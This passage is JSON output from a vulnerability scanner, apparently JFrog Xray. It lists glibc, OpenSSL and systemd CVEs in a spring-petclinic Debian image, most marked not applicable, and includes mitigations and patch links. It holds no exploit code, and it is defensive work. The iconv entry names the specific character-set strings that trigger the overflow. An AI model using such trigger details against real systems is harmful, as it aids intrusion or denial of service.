            "id": 0,
            "PublicVulnsTblID": 0,
            "VulnId": "XRAY-599387",
            "VulnerabilityTitle": "",
            "ShortDescription": "A stack buffer overflow in the Name Service Cache Daemon (NSCD) in the GNU C library may lead to remote code execution.",
            "FullDescription": "",
            "Impact": 6,
            "VulnerabilityType": "Remote code execution",
            "Resolution": "##### Deployment mitigations\n\nDisable netgroup caching in the NSCD configuration.\nRemove the following line from `/etc/nscd.conf` -\n```\nenable-cache netgroup yes\n```",
            "ExtendedImpactReasons": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The issue results in a severe impact (such as remote code execution)",
                  "Description": "Potential remote code execution.",
                  "IsPositive": 0,
                  "InsertOrder": 3
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "No high-impact exploit or technical writeup were published, and exploitation of the issue with high impact is either non-trivial or completely unproven",
                  "Description": "No PoC and no technical writeup were published.",
                  "IsPositive": 1,
                  "InsertOrder": 1
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "Exploitation of the issue is only possible when the vulnerable component is used in a specific manner. The attacker has to perform per-target research to determine the vulnerable attack vector",
                  "Description": "The `/etc/nscd.conf` configuration file does not support netgroup caching by default.",
                  "IsPositive": 1,
                  "InsertOrder": 2
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The issue can be exploited by attackers over the network",
                  "Description": "The Name Service Cache Daemon accepts arbitrary network input.",
                  "IsPositive": 0,
                  "InsertOrder": 4
               }
            ],
            "ExtendedReferences": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Patch",
                  "Title": "Fix Commit",
                  "Url": "https://sourceware.org/git/?p=glibc.git;a=commit;h=87801a8fd06db1d654eea3e4f7626ff476a9bdaa",
                  "InsertOrder": 1
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Advisory",
                  "Title": "GlibC Advisory",
                  "Url": "https://sourceware.org/git/?p=glibc.git;a=blob;f=advisories/GLIBC-SA-2024-0005",
                  "InsertOrder": 2
               }
            ],
            "ExtendedRelatedVulns": null
         },
         "component_physical_paths": [
            ""
         ],
         "is_cve_applicable": false,
         "cve_applicability_info": {
            "scanner_available": true,
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "deb://debian:bullseye:libc-bin:2.31-13+deb11u3",
            "cve_id": "CVE-2024-33599",
            "scan_status": 1,
            "applicability": false,
            "evidence": null,
            "info": "Did not find NSCD executable",
            "details": null
         },
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "deb://debian:bullseye:libc-bin:2.31-13+deb11u3",
            "vulnerability_id": "CVE-2024-33599",
            "result": "not_applicable"
         }
      },
      {
         "id": "XRAY-598749",
         "severity": "Unknown",
         "jfrog_severity": "High",
         "severity_source": "Debian Security Bug Tracker",
         "pkg_type": "debian",
         "summary": "The iconv() function in the GNU C Library versions 2.39 and older may overflow the output buffer passed to it by up to 4 bytes when converting strings to the ISO-2022-CN-EXT character set, which may be used to crash an application or overwrite a neighbouring variable.",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "debian:bullseye:libc-bin",
         "source_id": "deb://debian:bullseye:libc-bin",
         "source_comp_id": "deb://debian:bullseye:libc-bin:2.31-13+deb11u3",
         "component_versions": {
            "id": "debian:bullseye:glibc",
            "vulnerable_versions": [
               "< 2.31-13+deb11u9"
            ],
            "fixed_versions": [
               "2.31-13+deb11u9"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2024-2961"
                  }
               ],
               "description": "The iconv() function in the GNU C Library versions 2.39 and older may overflow the output buffer passed to it by up to 4 bytes when converting strings to the ISO-2022-CN-EXT character set, which may be used to crash an application or overwrite a neighbouring variable.",
               "provider": "JFrog"
            }
         },
         "edited": "0001-01-01T00:00:00Z",
         "is_source_root": false,
         "is_high_profile": true,
         "high_profile_info": {
            "id": 0,
            "PublicVulnsTblID": 0,
            "VulnId": "XRAY-598749",
            "VulnerabilityTitle": "",
            "ShortDescription": "An out-of-bound write vulnerability in Glibc can lead to denial of service when using a specific character set.",
            "FullDescription": "[Glibc](https://www.gnu.org/software/libc/) is a library that provides core libraries with API functions.\n\n`ISO-2022-CN` is a 7-bit Chinese character encoding that supports simplified and traditional Chinese characters. `ISO-2022-CN-EXT` is an extension of `ISO-2022-CN` that supports other GB character sets.\n\nThe vulnerability was introduced in the GNU C Library versions 2.39 in the `iconv()` function.\nAttackers can use the out-of-bounds write vulnerability by overflowing the buffer passed to the `iconv()` function and potentially overwriting the neighboring variables or crashing the application.\n`SS2designation` and `SS3designation` do not perform the necessary boundary checks, allowing attackers to overflow of 1, 2, or 3 bytes with fixed values by converting the following strings to the `ISO-2022-CN-EXT` character set: '$+I', '$+J', '$+K', '$+L', '$+M', or '$*H'.\n\nThe researcher who found the vulnerability mentioned that it is not likely to be exploited in most libraries and programs except for PHP which was found to be applicable.",
            "Impact": 6,
            "VulnerabilityType": "Denial of service",
            "Resolution": "",
            "ExtendedImpactReasons": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "Exploitation of the issue is only possible when the vulnerable component is used in a specific manner. The attacker has to perform per-target research to determine the vulnerable attack vector",
                  "Description": "The researcher who found the vulnerability mentioned that it is not likely to be exploited in most libraries and programs except for PHP which was found to be applicable.",
                  "IsPositive": 1,
                  "InsertOrder": 1
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The issue results in a severe impact (such as remote code execution)",
                  "Description": "This issue can lead to a Denial of Service.",
                  "IsPositive": 0,
                  "InsertOrder": 2
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The issue has multiple mentions in general media",
                  "Description": "The vulnerability was discussed at the OffensiveCon conference.",
                  "IsPositive": 0,
                  "InsertOrder": 3
               }
            ],
            "ExtendedReferences": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Advisory",
                  "Title": "Glibc advisory",
                  "Url": "https://sourceware.org/git/?p=glibc.git;a=commit;h=f9dc609e06b1136bb0408be9605ce7973a767ada",
                  "InsertOrder": 1
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Patch",
                  "Title": "Fix commit",
                  "Url": "https://sourceware.org/git/?p=glibc.git;a=blob;f=advisories/GLIBC-SA-2024-0004",
                  "InsertOrder": 2
               }
            ],
            "ExtendedRelatedVulns": null
         },
         "component_physical_paths": [
            ""
         ],
         "is_cve_applicable": false,
         "cve_applicability_info": {
            "scanner_available": true,
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "deb://debian:bullseye:libc-bin:2.31-13+deb11u3",
            "cve_id": "CVE-2024-2961",
            "scan_status": 1,
            "applicability": false,
            "evidence": null,
            "info": "The vulnerable iconv function is never called",
            "details": null
         },
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "deb://debian:bullseye:libc-bin:2.31-13+deb11u3",
            "vulnerability_id": "CVE-2024-2961",
            "result": "not_applicable"
         }
      },
      {
         "id": "XRAY-598749",
         "severity": "Unknown",
         "jfrog_severity": "High",
         "severity_source": "Debian Security Bug Tracker",
         "pkg_type": "debian",
         "summary": "The iconv() function in the GNU C Library versions 2.39 and older may overflow the output buffer passed to it by up to 4 bytes when converting strings to the ISO-2022-CN-EXT character set, which may be used to crash an application or overwrite a neighbouring variable.",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "debian:bullseye:libc6",
         "source_id": "deb://debian:bullseye:libc6",
         "source_comp_id": "deb://debian:bullseye:libc-bin:2.31-13+deb11u3",
         "component_versions": {
            "id": "debian:bullseye:glibc",
            "vulnerable_versions": [
               "< 2.31-13+deb11u9"
            ],
            "fixed_versions": [
               "2.31-13+deb11u9"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2024-2961"
                  }
               ],
               "description": "The iconv() function in the GNU C Library versions 2.39 and older may overflow the output buffer passed to it by up to 4 bytes when converting strings to the ISO-2022-CN-EXT character set, which may be used to crash an application or overwrite a neighbouring variable.",
               "provider": "JFrog"
            }
         },
         "edited": "0001-01-01T00:00:00Z",
         "is_source_root": false,
         "is_high_profile": true,
         "high_profile_info": {
            "id": 0,
            "PublicVulnsTblID": 0,
            "VulnId": "XRAY-598749",
            "VulnerabilityTitle": "",
            "ShortDescription": "An out-of-bound write vulnerability in Glibc can lead to denial of service when using a specific character set.",
            "FullDescription": "[Glibc](https://www.gnu.org/software/libc/) is a library that provides core libraries with API functions.\n\n`ISO-2022-CN` is a 7-bit Chinese character encoding that supports simplified and traditional Chinese characters. `ISO-2022-CN-EXT` is an extension of `ISO-2022-CN` that supports other GB character sets.\n\nThe vulnerability was introduced in the GNU C Library versions 2.39 in the `iconv()` function.\nAttackers can use the out-of-bounds write vulnerability by overflowing the buffer passed to the `iconv()` function and potentially overwriting the neighboring variables or crashing the application.\n`SS2designation` and `SS3designation` do not perform the necessary boundary checks, allowing attackers to overflow of 1, 2, or 3 bytes with fixed values by converting the following strings to the `ISO-2022-CN-EXT` character set: '$+I', '$+J', '$+K', '$+L', '$+M', or '$*H'.\n\nThe researcher who found the vulnerability mentioned that it is not likely to be exploited in most libraries and programs except for PHP which was found to be applicable.",
            "Impact": 6,
            "VulnerabilityType": "Denial of service",
            "Resolution": "",
            "ExtendedImpactReasons": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "Exploitation of the issue is only possible when the vulnerable component is used in a specific manner. The attacker has to perform per-target research to determine the vulnerable attack vector",
                  "Description": "The researcher who found the vulnerability mentioned that it is not likely to be exploited in most libraries and programs except for PHP which was found to be applicable.",
                  "IsPositive": 1,
                  "InsertOrder": 1
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The issue results in a severe impact (such as remote code execution)",
                  "Description": "This issue can lead to a Denial of Service.",
                  "IsPositive": 0,
                  "InsertOrder": 2
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The issue has multiple mentions in general media",
                  "Description": "The vulnerability was discussed at the OffensiveCon conference.",
                  "IsPositive": 0,
                  "InsertOrder": 3
               }
            ],
            "ExtendedReferences": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Advisory",
                  "Title": "Glibc advisory",
                  "Url": "https://sourceware.org/git/?p=glibc.git;a=commit;h=f9dc609e06b1136bb0408be9605ce7973a767ada",
                  "InsertOrder": 1
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Patch",
                  "Title": "Fix commit",
                  "Url": "https://sourceware.org/git/?p=glibc.git;a=blob;f=advisories/GLIBC-SA-2024-0004",
                  "InsertOrder": 2
               }
            ],
            "ExtendedRelatedVulns": null
         },
         "component_physical_paths": [
            ""
         ],
         "is_cve_applicable": false,
         "cve_applicability_info": {
            "scanner_available": true,
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "deb://debian:bullseye:libc-bin:2.31-13+deb11u3",
            "cve_id": "CVE-2024-2961",
            "scan_status": 1,
            "applicability": false,
            "evidence": null,
            "info": "The vulnerable iconv function is never called",
            "details": null
         },
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "deb://debian:bullseye:libc-bin:2.31-13+deb11u3",
            "vulnerability_id": "CVE-2024-2961",
            "result": "not_applicable"
         }
      },
      {
         "id": "XRAY-599388",
         "severity": "Unknown",
         "jfrog_severity": "Medium",
         "severity_source": "Debian Security Bug Tracker",
         "pkg_type": "debian",
         "summary": "nscd: Null pointer crashes after notfound response\n\nIf the Name Service Cache Daemon's (nscd) cache fails to add a not-found\nnetgroup response to the cache, the client request can result in a null\npointer dereference.  This flaw was introduced in glibc 2.15 when the\ncache was added to nscd.\n\nThis vulnerability is only present in the nscd binary.",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "debian:bullseye:libc6",
         "source_id": "deb://debian:bullseye:libc6",
         "source_comp_id": "deb://debian:bullseye:libc-bin:2.31-13+deb11u3",
         "component_versions": {
            "id": "debian:bullseye:glibc",
            "vulnerable_versions": [
               "< 2.31-13+deb11u10"
            ],
            "fixed_versions": [
               "2.31-13+deb11u10"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2024-33600"
                  }
               ],
               "description": "nscd: Null pointer crashes after notfound response  If the Name Service Cache Daemon's (nscd) cache fails to add a not-found netgroup response to the cache, the client request can result in a null pointer dereference.  This flaw was introduced in glibc 2.15 when the cache was added to nscd.  This vulnerability is only present in the nscd binary.",
               "provider": "JFrog"
            }
         },
         "edited": "0001-01-01T00:00:00Z",
         "is_source_root": false,
         "is_high_profile": true,
         "high_profile_info": {
            "id": 0,
            "PublicVulnsTblID": 0,
            "VulnId": "XRAY-599388",
            "VulnerabilityTitle": "",
            "ShortDescription": "A null pointer dereference in the Name Service Cache Daemon (NSCD) in the GNU C library may lead to denial of service.",
            "FullDescription": "",
            "Impact": 5,
            "VulnerabilityType": "Denial of service",
            "Resolution": "##### Deployment mitigations\n\nDisable netgroup caching in the NSCD configuration.\nRemove the following line from `/etc/nscd.conf` -\n```\nenable-cache netgroup yes\n```",
            "ExtendedImpactReasons": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "No high-impact exploit or technical writeup were published, and exploitation of the issue with high impact is either non-trivial or completely unproven",
                  "Description": "No PoC and no technical writeup were published.",
                  "IsPositive": 1,
                  "InsertOrder": 1
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "Exploitation of the issue is only possible when the vulnerable component is used in a specific manner. The attacker has to perform per-target research to determine the vulnerable attack vector",
                  "Description": "The `/etc/nscd.conf` configuration file does not support netgroup caching by default.",
                  "IsPositive": 1,
                  "InsertOrder": 2
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The issue can be exploited by attackers over the network",
                  "Description": "The Name Service Cache Daemon accepts arbitrary network input",
                  "IsPositive": 0,
                  "InsertOrder": 3
               }
            ],
            "ExtendedReferences": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Patch",
                  "Title": "Fix commit",
                  "Url": "https://sourceware.org/git/?p=glibc.git;a=commit;h=b048a482f088e53144d26a61c390bed0210f49f2",
                  "InsertOrder": 1
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Patch",
                  "Title": "Fix commit",
                  "Url": "https://sourceware.org/git/?p=glibc.git;a=commit;h=7835b00dbce53c3c87bbbb1754a95fb5e58187aa",
                  "InsertOrder": 2
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Advisory",
                  "Title": "GlibC Advisory",
                  "Url": "https://sourceware.org/git/?p=glibc.git;a=blob;f=advisories/GLIBC-SA-2024-0006",
                  "InsertOrder": 3
               }
            ],
            "ExtendedRelatedVulns": null
         },
         "component_physical_paths": [
            ""
         ],
         "is_cve_applicable": false,
         "cve_applicability_info": {
            "scanner_available": true,
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "deb://debian:bullseye:libc-bin:2.31-13+deb11u3",
            "cve_id": "CVE-2024-33600",
            "scan_status": 1,
            "applicability": false,
            "evidence": null,
            "info": "Did not find NSCD executable",
            "details": null
         },
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "deb://debian:bullseye:libc-bin:2.31-13+deb11u3",
            "vulnerability_id": "CVE-2024-33600",
            "result": "not_applicable"
         }
      },
      {
         "id": "XRAY-599388",
         "severity": "Unknown",
         "jfrog_severity": "Medium",
         "severity_source": "Debian Security Bug Tracker",
         "pkg_type": "debian",
         "summary": "nscd: Null pointer crashes after notfound response\n\nIf the Name Service Cache Daemon's (nscd) cache fails to add a not-found\nnetgroup response to the cache, the client request can result in a null\npointer dereference.  This flaw was introduced in glibc 2.15 when the\ncache was added to nscd.\n\nThis vulnerability is only present in the nscd binary.",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "debian:bullseye:libc-bin",
         "source_id": "deb://debian:bullseye:libc-bin",
         "source_comp_id": "deb://debian:bullseye:libc-bin:2.31-13+deb11u3",
         "component_versions": {
            "id": "debian:bullseye:glibc",
            "vulnerable_versions": [
               "< 2.31-13+deb11u10"
            ],
            "fixed_versions": [
               "2.31-13+deb11u10"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2024-33600"
                  }
               ],
               "description": "nscd: Null pointer crashes after notfound response  If the Name Service Cache Daemon's (nscd) cache fails to add a not-found netgroup response to the cache, the client request can result in a null pointer dereference.  This flaw was introduced in glibc 2.15 when the cache was added to nscd.  This vulnerability is only present in the nscd binary.",
               "provider": "JFrog"
            }
         },
         "edited": "0001-01-01T00:00:00Z",
         "is_source_root": false,
         "is_high_profile": true,
         "high_profile_info": {
            "id": 0,
            "PublicVulnsTblID": 0,
            "VulnId": "XRAY-599388",
            "VulnerabilityTitle": "",
            "ShortDescription": "A null pointer dereference in the Name Service Cache Daemon (NSCD) in the GNU C library may lead to denial of service.",
            "FullDescription": "",
            "Impact": 5,
            "VulnerabilityType": "Denial of service",
            "Resolution": "##### Deployment mitigations\n\nDisable netgroup caching in the NSCD configuration.\nRemove the following line from `/etc/nscd.conf` -\n```\nenable-cache netgroup yes\n```",
            "ExtendedImpactReasons": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "No high-impact exploit or technical writeup were published, and exploitation of the issue with high impact is either non-trivial or completely unproven",
                  "Description": "No PoC and no technical writeup were published.",
                  "IsPositive": 1,
                  "InsertOrder": 1
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "Exploitation of the issue is only possible when the vulnerable component is used in a specific manner. The attacker has to perform per-target research to determine the vulnerable attack vector",
                  "Description": "The `/etc/nscd.conf` configuration file does not support netgroup caching by default.",
                  "IsPositive": 1,
                  "InsertOrder": 2
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "Name": "The issue can be exploited by attackers over the network",
                  "Description": "The Name Service Cache Daemon accepts arbitrary network input",
                  "IsPositive": 0,
                  "InsertOrder": 3
               }
            ],
            "ExtendedReferences": [
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Patch",
                  "Title": "Fix commit",
                  "Url": "https://sourceware.org/git/?p=glibc.git;a=commit;h=b048a482f088e53144d26a61c390bed0210f49f2",
                  "InsertOrder": 1
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Patch",
                  "Title": "Fix commit",
                  "Url": "https://sourceware.org/git/?p=glibc.git;a=commit;h=7835b00dbce53c3c87bbbb1754a95fb5e58187aa",
                  "InsertOrder": 2
               },
               {
                  "id": 0,
                  "PublicVulnsExtendedTblId": 0,
                  "RefType": "Advisory",
                  "Title": "GlibC Advisory",
                  "Url": "https://sourceware.org/git/?p=glibc.git;a=blob;f=advisories/GLIBC-SA-2024-0006",
                  "InsertOrder": 3
               }
            ],
            "ExtendedRelatedVulns": null
         },
         "component_physical_paths": [
            ""
         ],
         "is_cve_applicable": false,
         "cve_applicability_info": {
            "scanner_available": true,
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "deb://debian:bullseye:libc-bin:2.31-13+deb11u3",
            "cve_id": "CVE-2024-33600",
            "scan_status": 1,
            "applicability": false,
            "evidence": null,
            "info": "Did not find NSCD executable",
            "details": null
         },
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "deb://debian:bullseye:libc-bin:2.31-13+deb11u3",
            "vulnerability_id": "CVE-2024-33600",
            "result": "not_applicable"
         }
      },
      {
         "id": "XRAY-603657",
         "severity": "Unknown",
         "severity_source": "Debian Security Bug Tracker",
         "pkg_type": "debian",
         "summary": "Issue summary: Calling the OpenSSL API function SSL_free_buffers may cause\nmemory to be accessed that was previously freed in some situations\n\nImpact summary: A use after free can have a range of potential consequences such\nas the corruption of valid data, crashes or execution of arbitrary code.\nHowever, only applications that directly call the SSL_free_buffers function are\naffected by this issue. Applications that do not call this function are not\nvulnerable. Our investigations indicate that this function is rarely used by\napplications.\n\nThe SSL_free_buffers function is used to free the internal OpenSSL buffer used\nwhen processing an incoming record from the network. The call is only expected\nto succeed if the buffer is not currently in use. However, two scenarios have\nbeen identified where the buffer is freed even when still in use.\n\nThe first scenario occurs where a record header has been received from the\nnetwork and processed by OpenSSL, but the full record body has not yet arrived.\nIn this case calling SSL_free_buffers will succeed even though a record has only\nbeen partially processed and the buffer is still in use.\n\nThe second scenario occurs where a full record containing application data has\nbeen received and processed by OpenSSL but the application has only read part of\nthis data. Again a call to SSL_free_buffers will succeed even though the buffer\nis still in use.\n\nWhile these scenarios could occur accidentally during normal operation a\nmalicious attacker could attempt to engineer a stituation where this occurs.\nWe are not aware of this issue being actively exploited.\n\nThe FIPS modules in 3.3, 3.2, 3.1 and 3.0 are not affected by this issue.",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "debian:bullseye:openssl",
         "source_id": "deb://debian:bullseye:openssl",
         "source_comp_id": "deb://debian:bullseye:libssl1.1:1.1.1n-0+deb11u1",
         "component_versions": {
            "id": "debian:bullseye:openssl",
            "vulnerable_versions": [
               "< 1.1.1w-0+deb11u2"
            ],
            "fixed_versions": [
               "1.1.1w-0+deb11u2"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2024-4741"
                  }
               ],
               "description": "Issue summary: Calling the OpenSSL API function SSL_free_buffers may cause memory to be accessed that was previously freed in some situations  Impact summary: A use after free can have a range of potential consequences such as the corruption of valid data, crashes or execution of arbitrary code. However, only applications that directly call the SSL_free_buffers function are affected by this issue. Applications that do not call this function are not vulnerable. Our investigations indicate that this function is rarely used by applications.  The SSL_free_buffers function is used to free the internal OpenSSL buffer used when processing an incoming record from the network. The call is only expected to succeed if the buffer is not currently in use. However, two scenarios have been identified where the buffer is freed even when still in use.  The first scenario occurs where a record header has been received from the network and processed by OpenSSL, but the full record body has not yet arrived. In this case calling SSL_free_buffers will succeed even though a record has only been partially processed and the buffer is still in use.  The second scenario occurs where a full record containing application data has been received and processed by OpenSSL but the application has only read part of this data. Again a call to SSL_free_buffers will succeed even though the buffer is still in use.  While these scenarios could occur accidentally during normal operation a malicious attacker could attempt to engineer a stituation where this occurs. We are not aware of this issue being actively exploited.  The FIPS modules in 3.3, 3.2, 3.1 and 3.0 are not affected by this issue.",
               "provider": "JFrog"
            }
         },
         "edited": "0001-01-01T00:00:00Z",
         "is_source_root": false,
         "is_high_profile": false,
         "component_physical_paths": [
            ""
         ],
         "is_cve_applicable": false,
         "cve_applicability_info": {
            "scanner_available": true,
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "deb://debian:bullseye:libssl1.1:1.1.1n-0+deb11u1",
            "cve_id": "CVE-2024-4741",
            "scan_status": 1,
            "applicability": false,
            "evidence": null,
            "info": "No references to the vulnerable function were found",
            "details": null
         },
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "deb://debian:bullseye:libssl1.1:1.1.1n-0+deb11u1",
            "vulnerability_id": "CVE-2024-4741",
            "result": "not_applicable"
         }
      },
      {
         "id": "XRAY-603657",
         "severity": "Unknown",
         "severity_source": "Debian Security Bug Tracker",
         "pkg_type": "debian",
         "summary": "Issue summary: Calling the OpenSSL API function SSL_free_buffers may cause\nmemory to be accessed that was previously freed in some situations\n\nImpact summary: A use after free can have a range of potential consequences such\nas the corruption of valid data, crashes or execution of arbitrary code.\nHowever, only applications that directly call the SSL_free_buffers function are\naffected by this issue. Applications that do not call this function are not\nvulnerable. Our investigations indicate that this function is rarely used by\napplications.\n\nThe SSL_free_buffers function is used to free the internal OpenSSL buffer used\nwhen processing an incoming record from the network. The call is only expected\nto succeed if the buffer is not currently in use. However, two scenarios have\nbeen identified where the buffer is freed even when still in use.\n\nThe first scenario occurs where a record header has been received from the\nnetwork and processed by OpenSSL, but the full record body has not yet arrived.\nIn this case calling SSL_free_buffers will succeed even though a record has only\nbeen partially processed and the buffer is still in use.\n\nThe second scenario occurs where a full record containing application data has\nbeen received and processed by OpenSSL but the application has only read part of\nthis data. Again a call to SSL_free_buffers will succeed even though the buffer\nis still in use.\n\nWhile these scenarios could occur accidentally during normal operation a\nmalicious attacker could attempt to engineer a stituation where this occurs.\nWe are not aware of this issue being actively exploited.\n\nThe FIPS modules in 3.3, 3.2, 3.1 and 3.0 are not affected by this issue.",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "debian:bullseye:libssl1.1",
         "source_id": "deb://debian:bullseye:libssl1.1",
         "source_comp_id": "deb://debian:bullseye:libssl1.1:1.1.1n-0+deb11u1",
         "component_versions": {
            "id": "debian:bullseye:openssl",
            "vulnerable_versions": [
               "< 1.1.1w-0+deb11u2"
            ],
            "fixed_versions": [
               "1.1.1w-0+deb11u2"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2024-4741"
                  }
               ],
               "description": "Issue summary: Calling the OpenSSL API function SSL_free_buffers may cause memory to be accessed that was previously freed in some situations  Impact summary: A use after free can have a range of potential consequences such as the corruption of valid data, crashes or execution of arbitrary code. However, only applications that directly call the SSL_free_buffers function are affected by this issue. Applications that do not call this function are not vulnerable. Our investigations indicate that this function is rarely used by applications.  The SSL_free_buffers function is used to free the internal OpenSSL buffer used when processing an incoming record from the network. The call is only expected to succeed if the buffer is not currently in use. However, two scenarios have been identified where the buffer is freed even when still in use.  The first scenario occurs where a record header has been received from the network and processed by OpenSSL, but the full record body has not yet arrived. In this case calling SSL_free_buffers will succeed even though a record has only been partially processed and the buffer is still in use.  The second scenario occurs where a full record containing application data has been received and processed by OpenSSL but the application has only read part of this data. Again a call to SSL_free_buffers will succeed even though the buffer is still in use.  While these scenarios could occur accidentally during normal operation a malicious attacker could attempt to engineer a stituation where this occurs. We are not aware of this issue being actively exploited.  The FIPS modules in 3.3, 3.2, 3.1 and 3.0 are not affected by this issue.",
               "provider": "JFrog"
            }
         },
         "edited": "0001-01-01T00:00:00Z",
         "is_source_root": false,
         "is_high_profile": false,
         "component_physical_paths": [
            ""
         ],
         "is_cve_applicable": false,
         "cve_applicability_info": {
            "scanner_available": true,
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "deb://debian:bullseye:libssl1.1:1.1.1n-0+deb11u1",
            "cve_id": "CVE-2024-4741",
            "scan_status": 1,
            "applicability": false,
            "evidence": null,
            "info": "No references to the vulnerable function were found",
            "details": null
         },
         "applicability_detail": {
            "component_id": "docker://spring-petclinic:04ae53315511903ae627b29ba572f73399f0eda3",
            "source_comp_id": "deb://debian:bullseye:libssl1.1:1.1.1n-0+deb11u1",
            "vulnerability_id": "CVE-2024-4741",
            "result": "not_applicable"
         }
      },
      {
         "id": "XRAY-590537",
         "severity": "High",
         "jfrog_severity": "High",
         "severity_source": "CVSS V3 from NVD",
         "pkg_type": "debian",
         "summary": "Certain DNSSEC aspects of the DNS protocol (in RFC 4033, 4034, 4035, 6840, and related RFCs) allow remote attackers to cause a denial of service (CPU consumption) via one or more DNSSEC responses, aka the \"KeyTrap\" issue. One of the concerns is that, when there is a zone with many DNSKEY and RRSIG records, the protocol specification implies that an algorithm must evaluate all combinations of DNSKEY and RRSIG records.",
         "issue_type": "security",
         "provider": "JFrog",
         "component": "debian:bullseye:libudev1",
         "source_id": "deb://debian:bullseye:libudev1",
         "source_comp_id": "deb://debian:bullseye:libudev1:247.3-7",
         "component_versions": {
            "id": "debian:bullseye:systemd",
            "vulnerable_versions": [
               "< 247.3-7+deb11u6"
            ],
            "fixed_versions": [
               "247.3-7+deb11u6"
            ],
            "more_details": {
               "cves": [
                  {
                     "cve": "CVE-2023-50387",
                     "cwe": [
                        "CWE-770"
                     ],
                     "cwe_details": {
                        "CWE-770": {
                           "name": "Allocation of Resources Without Limits or Throttling",
                           "description": "The product allocates a reusable resource or group of resources on behalf of an actor without imposing any restrictions on the size or number of resources that can be allocated, in violation of the intended security policy for that actor."
                        }
                     },
                     "cvss_v3": "7.5/CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H"
                  }
               ],
               "description": "Certain DNSSEC aspects of the DNS protocol (in RFC 4033, 4034, 4035, 6840, and related RFCs) allow remote attackers to cause a denial of service (CPU consumption) via one or more DNSSEC responses, aka the \"KeyTrap\" issue. One of the concerns is that, when there is a zone with many DNSKEY and RRSIG records, the protocol specification implies that an algorithm must evaluate all combinations of DNSKEY and RRSIG records.",
               "provider": "JFrog"
            }
         },
         "edited": "0001-01-01T00:00:00Z",
         "is_source_root": false,
         "is_high_profile": true,
         "high_profile_info": {
            "id": 0,
            "PublicVulnsTblID": 0,
            "VulnId": "XRAY-590537",
            "VulnerabilityTitle": "KeyTrap",
            "ShortDescription": "Unbounded resource consumption in the DNSSEC extension of the DNS protocol may lead to denial of service when resolving a malicious domain.",
            "FullDescription": "",
            "Impact": 6,
            "VulnerabilityType": "Denial of service",
